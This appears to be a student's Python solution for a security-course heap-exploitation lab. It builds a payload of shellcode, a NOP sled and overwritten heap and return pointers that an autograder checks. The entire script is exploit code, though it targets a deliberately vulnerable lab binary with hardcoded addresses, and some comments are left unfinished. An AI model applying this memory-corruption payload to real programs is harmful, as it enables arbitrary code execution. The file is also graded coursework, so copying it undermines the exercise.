#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# You MUST fill in the values of the a, b, and c node pointers below. When you
# use heap addresses in your main solution, you MUST use these values or
# offsets from these values. If you do not correctly fill in these values and use
# them in your solution, the autograder may be unable to correctly grade your
# solution.

# IMPORTANT NOTE: When you pass your 3 inputs to your program, they are stored8
# in memory inside of argv, but these addresses will be different then the
# addresses of these 3 nodes on the heap. Ensure you are using the heap
# addresses here, and not the addresses of the 3 arguments inside argv.

# data for A is at 0xffffd362 and is 

node_a = 0x80dd350
node_b = 0x80dd320
node_c = 0x80dd2f0

# shellcode

shelladdr = pack("<I", 0x080dd353)

# ret from delete
retaddr= pack("<I", 0xfffec44c)

# Your code here b"\xeb" + b"\x06" + b"\x90"*6+

sys.stdout.buffer.write(shellcode + b" " + b"\x90"*40+b"\x58\xc4\xfe\xff\xf0\xd2\x0d\x08"+b" " + b"C"*4)

